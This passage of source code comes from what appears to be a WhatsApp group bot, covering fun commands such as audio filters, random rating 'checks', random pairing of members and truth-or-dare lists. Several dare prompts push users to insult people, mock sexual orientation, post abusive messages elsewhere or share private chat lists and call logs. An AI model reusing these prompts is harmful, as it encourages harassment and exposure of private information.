if (args.length < 1) return reply(`Example:\n${prefix}fliptext ${ownername}`)
quere = args.join(" ")
flipe = quere.split('').reverse().join('')
reply(`\`\`\`「 FLIP TEXT 」\`\`\`\n*•> Normal :*\n${quere}\n*•> Flip :*\n${flipe}`)
}
break
            case 'toqr':{
  if (!q) return reply(' Please include link or text!')
   const QrCode = require('qrcode-reader')
   const qrcode = require('qrcode')
   let qyuer = await qrcode.toDataURL(q, { scale: 35 })
   let data = new Buffer.from(qyuer.replace('data:image/png;base64,', ''), 'base64')
   let buff = getRandom('.jpg')
   await fs.writeFileSync('./'+buff, data)
   let medi = fs.readFileSync('./' + buff)
  await Biiofc.sendMessage(from, { image: medi, caption:"Here you go!"}, { quoted: m })
   setTimeout(() => { fs.unlinkSync(buff) }, 10000)
  }
  break
case 'say': case 'tts': case 'gtts':{
if (!text) return reply('Where is the text?')
            let texttts = text
            const xeonrl = googleTTS.getAudioUrl(texttts, {
                lang: "en",
                slow: false,
                host: "https://translate.google.com",
            })
            return Biiofc.sendMessage(m.chat, {
                audio: {
                    url: xeonrl,
                },
                mimetype: 'audio/mp4',
                ptt: true,
                fileName: `${text}.mp3`,
            }, {
                quoted: m,
            })
        }
        break
case 'bass': case 'blown': case 'deep': case 'earrape': case 'fast': case 'fat': case 'nightcore': case 'reverse': case 'robot': case 'slow': case 'smooth': case 'squirrel':
                try {
                let set
                if (/bass/.test(command)) set = '-af equalizer=f=54:width_type=o:width=2:g=20'
                if (/blown/.test(command)) set = '-af acrusher=.1:1:64:0:log'
                if (/deep/.test(command)) set = '-af atempo=4/4,asetrate=44500*2/3'
                if (/earrape/.test(command)) set = '-af volume=12'
                if (/fast/.test(command)) set = '-filter:a "atempo=1.63,asetrate=44100"'
                if (/fat/.test(command)) set = '-filter:a "atempo=1.6,asetrate=22100"'
                if (/nightcore/.test(command)) set = '-filter:a atempo=1.06,asetrate=44100*1.25'
                if (/reverse/.test(command)) set = '-filter_complex "areverse"'
                if (/robot/.test(command)) set = '-filter_complex "afftfilt=real=\'hypot(re,im)*sin(0)\':imag=\'hypot(re,im)*cos(0)\':win_size=512:overlap=0.75"'
                if (/slow/.test(command)) set = '-filter:a "atempo=0.7,asetrate=44100"'
                if (/smooth/.test(command)) set = '-filter:v "minterpolate=\'mi_mode=mci:mc_mode=aobmc:vsbmc=1:fps=120\'"'
                if (/squirrel/.test(command)) set = '-filter:a "atempo=0.5,asetrate=65100"'
                if (/audio/.test(mime)) {
                XeonStickWait()
                let media = await Biiofc.downloadAndSaveMediaMessage(quoted)
                let ran = getRandom('.mp3')
                exec(`ffmpeg -i ${media} ${set} ${ran}`, (err, stderr, stdout) => {
                fs.unlinkSync(media)
                if (err) return reply(err)
                let buff = fs.readFileSync(ran)
                Biiofc.sendMessage(m.chat, { audio: buff, mimetype: 'audio/mpeg' }, { quoted : m })
                fs.unlinkSync(ran)
                })
                } else reply(`Reply to the audio you want to change with a caption *${prefix + command}*`)
                } catch (e) {
                reply(e)
                }
                break
 case 'tinyurl':{
   if(!q) return reply('link?')
   const request = require('request')
   request(`https://tinyurl.com/api-create.php?url=${q}`, function (error, response, body) {
   try {
  reply(body)
  } catch (e) {
  reply(e)
  }
  })
  }
 break
case 'beautifulcheck':
				if (!text) return reply(`Tag Someone, Example : ${prefix + command} @RafatharOfficial`)
					const can = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					const tik = can[Math.floor(Math.random() * can.length)]
Biiofc.sendMessage(from, { text: `*${command}*\n\nNama : ${q}\nAnswer : *${tik}%*` }, { quoted: m })
					break
					case 'charactercheck':
					if (!text) return reply(`Tag Someone, Example : ${prefix + command} @RafatharOfficial`)
					const xeony =['Compassionate','Generous','Grumpy','Forgiving','Obedient','Good','Simp','Kind-Hearted','patient','UwU','top, anyway','Helpful']
					const taky = xeony[Math.floor(Math.random() * xeony.length)]
					Biiofc.sendMessage(from, { text: `Character Check : ${q}\nAnswer : *${taky}*` }, { quoted: m })
				     break
case 'awesomecheck':
  case 'greatcheck':
    case 'gaycheck':
      case 'cutecheck':
        case 'lesbicheck':
          case 'lesbiancheck':
             case 'hornycheck':
                 case 'prettycheck':
                    case 'lovelycheck':
                      case 'uglycheck':
if (!m.isGroup) return reply(mess.group)
const cex = body.slice(0)
const cek1 = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
const cek2 = cek1[Math.floor(Math.random() * cek1.length)]
if (mentionByReply) {
Biiofc.sendMessage(from, { text: 'Question : *' + cex + '*\nChecker : ' + `@${mentionByReply.split('@')[0]}` + '\nAnswer : ' + cek2 + '%', mentions: [mentionByReply] }, { quoted: m })
} else if (mentionByTag[0] && isGroup) {
Biiofc.sendMessage(from, { text: 'Question : *' + cex + '*\nChecker : ' + `@${mentionByTag[0].split('@')[0]}` + '\nAnswer : ' + cek2 + '%', mentions: [mentionByTag[0]] }, { quoted: m })
} else if (!mentionByReply && !mentionByTag[0]) {
Biiofc.sendMessage(from, { text: 'Question : *' + cex + '*\nChecker : ' + `@${sender.split('@')[0]}` + '\nAnswer : ' + cek2 + '%', mentions: [sender] }, { quoted: m })
}
break
case 'checkme':
					neme = args.join(" ")
					bet = `${sender}`
					var sifat = ['Fine','Unfriendly','Chapri','Nibba/nibbi','Annoying','Dilapidated','Angry person','Polite','Burden','Great','Cringe','Liar']
					var hoby = ['Cooking','Dancing','Playing','Gaming','Painting','Helping Others','Watching anime','Reading','Riding Bike','Singing','Chatting','Sharing Memes','Drawing','Eating Parents Money','Playing Truth or Dare','Staying Alone']
					var bukcin = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					var arp = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					var cakep = ['Yes','No','Very Ugly','Very Handsome']
					var wetak= ['Caring','Generous','Angry person','Sorry','Submissive','Fine','Im sorry','Kind Hearted','Patient','UwU','Top','Helpful']
					var baikk = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					var bhuruk = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					var cerdhas = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					var berhani = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					var mengheikan = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					var sipat = sifat[Math.floor(Math.random() * sifat.length)]
					var biho = hoby[Math.floor(Math.random() * hoby.length)]
					var bhucin = bukcin[Math.floor(Math.random() * bukcin.length)]
					var senga = arp[Math.floor(Math.random() * arp.length)]
					var chakep = cakep[Math.floor(Math.random() * cakep.length)]
					var watak = wetak[Math.floor(Math.random() * wetak.length)]
					var baik = baikk[Math.floor(Math.random() * baikk.length)]
					var burug = bhuruk[Math.floor(Math.random() * bhuruk.length)]
					var cerdas = cerdhas[Math.floor(Math.random() * cerdhas.length)]
					var berani = berhani[Math.floor(Math.random() * berhani.length)]
					var takut = mengheikan[Math.floor(Math.random() * mengheikan.length)]
					 profile = `*≡══《 Check @${bet.split('@')[0]} 》══≡*

*Name :* ${pushname}
*Characteristic :* ${sipat}
*Hobby :* ${biho}
*Simp :* ${bhucin}%
*Great :* ${senga}%
*Handsome :* ${chakep}
*Character :* ${watak}
*Good Morals :* ${baik}%
*Bad Morals :* ${burug}%
*Intelligence :* ${cerdas}%
*Courage :* ${berani}%
*Afraid :* ${takut}%

*≡═══《 CHECK PROPERTIES 》═══≡*`
					buff = await getBuffer(fkethmb)
Biiofc.sendMessage(from, { image: buff, caption: profile, mentions: [bet]},{quoted:m})
break
case 'woof':
case '8ball':
case 'goose':
case 'gecg':
case 'feed':
case 'avatar':
case 'fox_girl':
case 'lizard':
case 'spank':
case 'meow':
case 'tickle':{
                axios.get(`https://nekos.life/api/v2/img/${command}`)
.then(({data}) => {
Biiofc.sendImageAsSticker(from, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'cry': case 'kill': case 'hug': case 'pat': case 'lick': 
case 'kiss': case 'bite': case 'yeet': case 'bully': case 'bonk':
case 'wink': case 'poke': case 'nom': case 'slap': case 'smile': 
case 'wave': case 'awoo': case 'blush': case 'smug': case 'glomp': 
case 'happy': case 'dance': case 'cringe': case 'cuddle': case 'highfive': 
case 'shinobu': case 'handhold': {

axios.get(`https://api.waifu.pics/sfw/${command}`)
.then(({data}) => {
Biiofc.sendImageAsSticker(from, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'soulmate': {
            if (!m.isGroup) return XeonStickGroup()
            let member = participants.map(u => u.id)
            let me = m.sender
            let jodoh = member[Math.floor(Math.random() * member.length)]
Biiofc.sendMessage(m.chat,
{ text: `👫Your Soulmate Is

@${me.split('@')[0]} ❤️ @${jodoh.split('@')[0]}`,
contextInfo:{
mentionedJid:[me, jodoh],
forwardingScore: 9999999,
isForwarded: true, 
"externalAdReply": {
"showAdAttribution": true,
"containsAutoReply": true,
"title": ` ${global.botname}`,
"body": `${ownername}`,
"previewType": "PHOTO",
"thumbnailUrl": ``,
"thumbnail": fs.readFileSync(`./XeonMedia/theme/cheemspic.jpg`),
"sourceUrl": `${wagc}`}}},
{ quoted: m})        
            }
            break
 case 'couple': {
            if (!m.isGroup) return XeonStickGroup()
            let member = participants.map(u => u.id)
            let orang = member[Math.floor(Math.random() * member.length)]
            let jodoh = member[Math.floor(Math.random() * member.length)]
Biiofc.sendMessage(m.chat,
{ text: `@${orang.split('@')[0]} ❤️ @${jodoh.split('@')[0]}
Cieeee, What's Going On❤️💖👀`,
contextInfo:{
mentionedJid:[orang, jodoh],
forwardingScore: 9999999,
isForwarded: true, 
"externalAdReply": {
"showAdAttribution": true,
"containsAutoReply": true,
"title": ` ${global.botname}`,
"body": `${ownername}`,
"previewType": "PHOTO",
"thumbnailUrl": ``,
"thumbnail": fs.readFileSync(`./XeonMedia/theme/cheemspic.jpg`),
"sourceUrl": `${wagc}`}}},
{ quoted: m})        
            }
            break
case 'quotes':
const quotexeony = await axios.get(`https://favqs.com/api/qotd`)
        const textquotes = `*${themeemoji} Quote:* ${quotexeony.data.quote.body}\n\n*${themeemoji} Author:* ${quotexeony.data.quote.author}`
return reply(textquotes)
break
case 'pick': {
            	if (!m.isGroup) return XeonStickGroup()
            	if (!text) return reply(`What do you want to pick?\nExample: ${prefix + command} idiot`)
             const groupMetadata = m.isGroup ? await Biiofc.groupMetadata(m.chat)
                 .catch((e) => {}) : ""
             const participants = m.isGroup ? await groupMetadata.participants : ""
             let member = participants.map((u) => u.id)
             let me = m.sender
             let xeonshimts = member[Math.floor(Math.random() * member.length)]
             Biiofc.sendMessage(from, { 
text: `The most *${text}* here is *@${xeonshimts.split("@")[0]}*`,
contextInfo:{
forwardingScore: 9999999,
isForwarded: true, 
mentionedJid:[xeonshimts],
"externalAdReply": {
"showAdAttribution": true,
"title": ` ${global.botname}`,
"body": `${ownername}`,
"containsAutoReply": true,
"previewType": "PHOTO",
"thumbnailUrl": ``,
"thumbnail": fs.readFileSync(`./XeonMedia/theme/cheemspic.jpg`),
"sourceUrl": `${wagc}`
}
}
}, { quoted: m })
         }
     break
case 'define': 
if (!q) return reply(`What do you want to define?`)
try {
targetfine = await axios.get(`http://api.urbandictionary.com/v0/define?term=${q}`)
if (!targetfine) return reply(mess.error)
const reply = `
*${themeemoji} Word:* ${q}
*${themeemoji} Definition:* ${targetfine.data.list[0].definition
    .replace(/\[/g, "")
    .replace(/\]/g, "")}
*${themeemoji} Example:* ${targetfine.data.list[0].example
    .replace(/\[/g, "")
    .replace(/\]/g, "")}`
   Biiofc.sendMessage(m.chat,{text:reply},{quoted:m})
} catch (err) {
    console.log(err)
    return reply(`*${q}* isn't a valid text`)
    }
    break
                case 'can': {
            	if (!text) return reply(`Ask question\n\nExample : ${prefix + command} i dance?`)
            	let bisa = [`Can`,`Can't`,`Cannot`,`Of Course You Can!!!`]
                let keh = bisa[Math.floor(Math.random() * bisa.length)]
                let jawab = `*Can ${text}*\nAnswer : ${keh}`
            await reply(jawab)
            }
            break
            case 'is': {
            	if (!text) return reply(`Ask question\n\nExample : ${prefix + command} she virgin?`)
            	let apa = [`Yes`, `No`, `It Could Be`, `Thats right`]
                let kah = apa[Math.floor(Math.random() * apa.length)]
                let jawab = `*Is ${text}*\nAnswer : ${kah}`                
            await reply(jawab)
            }
            break
            case 'when': {
            	if (!text) return reply(`Ask question\n\nExample : ${prefix + command} will i get married?`)
            	let kapan = ['5 More Days', '10 More Days', '15 More Days','20 More Days', '25 More Days','30 More Days','35 More Days','40 More Days','45 More Days','50 More Days','55 More Days','60 More Days','65 More Days','70 More Days','75 More Days','80 More Days','85 More Days','90 More Days','100 More Days','5 Months More', '10 Months More', '15 Months More','20 Months More', '25 Months More','30 Months More','35 Months More','40 Months More','45 Months More','50 Months More','55 Months More','60 Months More','65 Months More','70 Months More','75 Months More','80 Months More','85 Months More','90 Months More','100 Months More','1 More Year','2 More Years','3 More Years','4 More Years','5 More Years','Tomorrow','The Day After Tomorrow']
                let koh = kapan[Math.floor(Math.random() * kapan.length)]
                let jawab = `*${command} ${text}*\nAnswer : ${koh}`                
            await reply(jawab)
            }
            break
case 'what': {
            	if (!text) return reply(`Ask question\n\nExample : ${prefix + command} is your name?`)
            	let lel = [`Ask Your Gf`, `I Dont Know`, `I Don't Know, Ask Your Father`]
                let kah = lel[Math.floor(Math.random() * lel.length)]
                let jawab = `*What ${text}*\nAnswer : ${kah}`                
            await reply(jawab)
            }
            break
case 'where': {
if (!text) return reply(`Ask question\n\nExample : ${prefix + command} is your name?`)
            	let wherelol = [`In the mountain`, `On mars`, `On moon`,`In the jungle`,`I dont know ask your mom`,`It could be somewhere`]
                let kah = wherelol[Math.floor(Math.random() * wherelol.length)]
                let jawab = `*Whwre ${text}*\nAnswer : ${kah}`              
            await reply(jawab)
            }
            break
case 'how': {
            	if (!text) return reply(`Ask question\n\nExample : ${prefix + command} to date girl?`)
            	let gimana = [`Ummm...`, `It's Difficult Bro`, `Sorry Bot Can't Answer`, `Try Searching On Google`,`Holy Cow! Really???`,`Dizzy Ah😴, don't wanna answer`,`Ohhh I See:(`,`The Patient, Boss:(`,`Really dude 🙄`]
                let kah = gimana[Math.floor(Math.random() * gimana.length)]
                let jawab = `*How ${text}*\nAnswer : ${kah}`                
            await reply(jawab)
            }
            break
case 'rate': {
if (!text) return reply(`Example : ${prefix + command} my profile`)
            	let ra = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
                let kah = ra[Math.floor(Math.random() * ra.length)]
                let jawab = `*Rate ${text}*\nAnswer : ${kah}%`                
            await reply(jawab)
            }
            break
            case 'stupidcheck':case 'uncleancheck':
case 'hotcheck': case 'smartcheck':
case 'greatcheck':
case 'evilcheck':case 'dogcheck':
case 'coolcheck':
case 'waifucheck':
cantik = body.slice(1)
const okebnh1 =['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
const xeonkak = okebnh1[Math.floor(Math.random() * okebnh1.length)]
Biiofc.sendMessage(m.chat, { text: xeonkak }, { quoted: m })
break
            case 'soulmate': {
            if (!m.isGroup) throw mess.group
            let member = participants.map(u => u.id)
            let me = m.sender
            let jodoh = member[Math.floor(Math.random() * member.length)]
Biiofc.sendMessage(m.chat,
{ text: `👫Your Soulmate Is

@${me.split('@')[0]} ❤️ @${jodoh.split('@')[0]}`,
contextInfo:{
mentionedJid:[me, jodoh],
forwardingScore: 9999999,
isForwarded: true, 
"externalAdReply": {
"showAdAttribution": true,
"containsAutoReply": true,
"title": ` ${global.botname}`,
"body": `${ownername}`,
"previewType": "PHOTO",
"thumbnailUrl": ``,
"thumbnail": fs.readFileSync(`./XeonMedia/theme/cheemspic.jpg`),
"sourceUrl": `${wagc}`}}},
{ quoted: m})        
            }
            break
case 'dare':
              const dare =[
    "eat 2 tablespoons of rice without any side dishes, if it's dragging you can drink",
    "spill people who make you pause",
    "call crush/pickle now and send ss",
    "drop only emote every time you type on gc/pc for 1 day.",
    "say Welcome to Who Wants To Be a Millionaire! to all the groups you have",
    "call ex saying miss",
    "sing the chorus of the last song you played",
    "vn your ex/crush/girlfriend, says hi (name), wants to call, just a moment. I missðŸ¥ºðŸ‘‰ðŸ¼ðŸ‘ˆðŸ¼",
	"Bang on the table (which is at home) until you get scolded for being noisy",
    "Tell random people _I was just told I was your twin first, we separated, then I had plastic surgery. And this is the most ciyusss_ thing",
    "mention ex's name",
    "make 1 rhyme for the members!",
    "send ur whatsapp chat list",
    "chat random people with gheto language then ss here",
    "tell your own version of embarrassing things",
    "tag the person you hate",
    "Pretending to be possessed, for example: possessed by dog, possessed by grasshoppers, possessed by refrigerator, etc.",
    "change name to *I AM DONKEY* for 24 hours",
    "shout *ma chuda ma chuda ma chuda* in front of your house",
    "snap/post boyfriend photo/crush",
    "tell me your boyfriend type!",
    "say *i hv crush on you, do you want to be my girlfriend?* to the opposite sex, the last time you chatted (submit on wa/tele), wait for him to reply, if you have, drop here",
    "record ur voice that read *titar ke age do titar, titar ke piche do titar*",
    "prank chat ex and say *i love u, please come back.* without saying dare!",
    "chat to contact wa in the order according to your battery %, then tell him *i am lucky to hv you!*",
    "change the name to *I am a child of randi* for 5 hours",
    "type in bengali 24 hours",
    "Use selmon bhoi photo for 3 days",
    "drop a song quote then tag a suitable member for that quote",
    "send voice note saying can i call u baby?",
    "ss recent call whatsapp",
    "Say *YOU ARE SO BEAUTIFUL DON'T LIE* to guys!",
    "pop to a group member, and say fuck you",
    "Act like a chicken in front of ur parents",
    "Pick up a random book and read one page out loud in vn n send it here",
    "Open your front door and howl like a wolf for 10 seconds",
    "Take an embarrassing selfie and paste it on your profile picture",
    "Let the group choose a word and a well known song. You have to sing that song and send it in voice note",
    "Walk on your elbows and knees for as long as you can",
    "sing national anthem in voice note",
    "Breakdance for 30 seconds in the sitting roomðŸ˜‚",
    "Tell the saddest story you know",
    "make a twerk dance video and put it on status for 5mins",
    "Eat a raw piece of garlic",
    "Show the last five people you texted and what the messages said",
    "put your full name on status for 5hrs",
    "make a short dance video without any filter just with a music and put it on ur status for 5hrs",
    "call ur bestie, bitch",
    "put your photo without filter on ur status for 10mins",
    "say i love oli london in voice noteðŸ¤£ðŸ¤£",
    "Send a message to your ex and say I still like you",
    "call Crush/girlfriend/bestie now and screenshot here",
    "pop to one of the group member personal chat and Say you ugly bustard",
    "say YOU ARE BEAUTIFUL/HANDSOME to one of person who is in top of ur pinlist or the first person on ur chatlist",
    "send voice notes and say, can i call u baby, if u r boy tag girl/if girl tag boy",
    "write i love you (random grup member name, who is online) in personal chat, (if u r boy write girl name/if girl write boy name) take a snap of the pic and send it here",
    "use any bollywood actor photo as ur pfp for 3 days",
    "put your crush photo on status with caption, this is my crush",
    "change name to I AM GAY for 5 hours",
    "chat to any contact in whatsapp and say i will be ur bf/gf for 5hours",
    "send voice note says i hv crush on you, want to be my girlfriend/boyfriend or not? to any random person from the grup(if u girl choose boy, if boy choose girl",
    "slap ur butt hardly send the sound of slap through voice noteðŸ˜‚",
    "state ur gf/bf type and send the photo here with caption, ugliest girl/boy in the world",
    "shout bravooooooooo and send here through voice note",
    "snap your face then send it here",
    "Send your photo with a caption, i am lesbian",
    "shout using harsh words and send it here through vn",
    "shout you bastard in front of your mom/papa",
    "change the name to i am idiot for 24 hours",
    "slap urself firmly and send the sound of slap through voice noteðŸ˜‚",
    "say i love the bot owner xeon through voice note",
    "send your gf/bf pic here",
    "make any tiktok dance challenge video and put it on status, u can delete it after 5hrs",
    "breakup with your best friend for 5hrs without telling him/her that its a dare",
     "tell one of your frnd that u love him/her and wanna marry him/her, without telling him/her that its a dare",
     "say i love depak kalal through voice note",
     "write i am feeling horny and put it on status, u can delete it only after 5hrs",
     "write i am lesbian and put it on status, u can delete only after 5hrs",
     "kiss your mommy or papa and say i love youðŸ˜Œ",
     "put your father name on status for 5hrs",
     "send abusive words in any grup, excepting this grup, and send screenshot proof here"
]
              const xeondare = dare[Math.floor(Math.random() * dare.length)]
              bufferdare = await getBuffer(`https://i.ibb.co/305yt26/bf84f20635dedd5dde31e7e5b6983ae9.jpg`)
              Biiofc.sendMessage(from, { image: bufferdare, caption: '_You choose DARE_\n'+ xeondare }, {quoted:m})
              break
                            break
       case 'truth':
              const truth =[
    "Have you ever liked anyone? How long?",
    "If you can or if you want, which gc/outside gc would you make friends with? (maybe different/same type)",
    "apa ketakutan terbesar kamu?",
    "Have you ever liked someone and felt that person likes you too?",
    "What is the name of your friend's ex-girlfriend that you used to secretly like?",
    "Have you ever stolen money from your father or mom? The reason?",
    "What makes you happy when you're sad?",
    "Ever had a one sided love? if so who? how does it feel bro?", 
    "been someone's mistress?",
    "the most feared thing",
    "Who is the most influential person in your life?",
    "what proud thing did you get this year", 
    "Who is the person who can make you awesome", 
    "Who is the person who has ever made you very happy?", 
    "Who is closest to your ideal type of partner here", 
    "Who do you like to play with??", 
    "Have you ever rejected people? the reason why?",
    "Mention an incident that made you hurt that you still remember", 
    "What achievements have you got this year??",
    "What's your worst habit at school??",
    "What song do you sing most in the shower",
    "Have you ever had a near-death experience",
    "When was the last time you were really angry. Why?",
    "Who is the last person who called you",
    "Do you have any hidden talents, What are they",
    "What word do you hate the most?",
    "What is the last YouTube video you watched?",
    "What is the last thing you Googled",
    "Who in this group would you want to swap lives with for a week",
    "What is the scariest thing thats ever happened to you",
    "Have you ever farted and blamed it on someone else",
    "When is the last time you made someone else cry",
    "Have you ever ghosted a friend",
    "Have you ever seen a dead body",
    "Which of your family members annoys you the most and why",
    "If you had to delete one app from your phone, which one would it be",
    "What app do you waste the most time on",
    "Have you ever faked sick to get home from school",
    "What is the most embarrassing item in your room",
    "What five items would you bring if you got stuck on a desert island",
    "Have you ever laughed so hard you peed your pants",
    "Do you smell your own farts",
    "have u ever peed on the bed while sleeping ??",
    "What is the biggest mistake you have ever made",
    "Have you ever cheated in an exam",
    "What is the worst thing you have ever done",
    "When was the last time you cried",
    "whom do you love the most among ur parents", 
    "do u sometimes put ur finger in ur nosetril?", 
    "who was ur crush during the school days",
    "tell honestly, do u like any boy in this grup",
    "have you ever liked anyone? how long?",
    "do you have gf/bf','what is your biggest fear?",
    "have you ever liked someone and felt that person likes you too?",
    "What is the name of your ex boyfriend of your friend that you once liked quietly?",
    "ever did you steal your mothers money or your fathers money",
    "what makes you happy when you are sad",
    "do you like someone who is in this grup? if you then who?",
    "have you ever been cheated on by people?",
    "who is the most important person in your life",
    "what proud things did you get this year",
    "who is the person who can make you happy when u r sad",
    "who is the person who ever made you feel uncomfortable",
    "have you ever lied to your parents",
    "do you still like ur ex",
    "who do you like to play together with?",
    "have you ever stolen big thing in ur life? the reason why?",
    "Mention the incident that makes you hurt that you still remember",
    "what achievements have you got this year?",
    "what was your worst habit at school?",
    "do you love the bot creator, xeon?ðŸ¤£",
    "have you ever thought of taking revenge from ur teacher?",
    "do you like current prime minister of ur country",
    "you non veg or veg",
    "if you could be invisible, what is the first thing you would do",
    "what is a secret you kept from your parents",
    "Who is your secret crush",
    "whois the last person you creeped on social media",
    "If a genie granted you three wishes, what would you ask for",
    "What is your biggest regret",
    "What animal do you think you most look like",
    "How many selfies do you take a day",
    "What was your favorite childhood show",
    "if you could be a fictional character for a day, who would you choose",
    "whom do you text the most",
    "What is the biggest lie you ever told your parents",
    "Who is your celebrity crush",
    "Whats the strangest dream you have ever had",
    "do you play pubg, if you then send ur id number"
]
              const xeontruth = truth[Math.floor(Math.random() * truth.length)]
              buffertruth = await getBuffer(`https://i.ibb.co/305yt26/bf84f20635dedd5dde31e7e5b6983ae9.jpg`)
              Biiofc.sendMessage(from, { image: buffertruth, caption: '_You choose TRUTH_\n'+ xeontruth }, {quoted:m})
              break
case 'handsomecheck':
				if (!text) return reply(`Tag Someone, Example : ${prefix + command} @Rafathar`)
					const gan = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					const teng = gan[Math.floor(Math.random() * gan.length)]
Biiofc.sendMessage(from, { text: `*${command}*\n\nName : ${q}\nAnswer : *${teng}%*` }, { quoted: m })
					break
case 'family100': {
 if ('family100'+from in _family100) {
 m.reply('Masih Ada Sesi Yang Belum Diselesaikan!')
 throw false
 }
 let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/family100.json')
 let random = anu[Math.floor(Math.random() * anu.length)]
 let hasil = `*Jawablah Pertanyaan Berikut :*\n${random.soal}\n\nTerdapat *${random.jawaban.length}* Jawaban ${random.jawaban.find(v => v.includes(' ')) ? `(beberapa Jawaban Terdapat Spasi)` : ''}`.trim()
 _family100['family100'+from] = {
 id: 'family100'+from,
 pesan: await Biiofc.sendText(from, hasil, m),
 ...random,
 terjawab: Array.from(random.jawaban, () => false),
 hadiah: 6,
 }
}
break
//=================================================//
case 'tebak': {
if (!isOwner) return m.reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
 if (!text) throw `Example : ${prefix + command} lagu\n\nOption : \n1. lagu\n2. gambar\n3. kata\n4. kalimat\n5. lirik\n6.lontong`
 if (args[0] === "lagu") {
 if (tebaklagu.hasOwnProperty(m.sender.split('@')[0])) throw "Masih Ada Sesi Yang Belum Diselesaikan!"
 let anu = await JSON.parse(fs.readFileSync('./database/Games/tebaklagu.json'));
 let result = anu[Math.floor(Math.random() * anu.length)]
 let msg = await Biiofc.sendMessage(from, { audio: { url: result.link_song }, mimetype: 'audio/mpeg' }, {quoted:m})
 Biiofc.sendText(from, `Lagu Tersebut Adalah Lagu dari?\n\nArtist : ${result.artist}\nWaktu : 60s`, msg).then(() => {
 tebaklagu[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
 })
 await sleep(3000)
 if (tebaklagu.hasOwnProperty(m.sender.split('@')[0])) {
 console.log("Jawaban: " + result.jawaban)
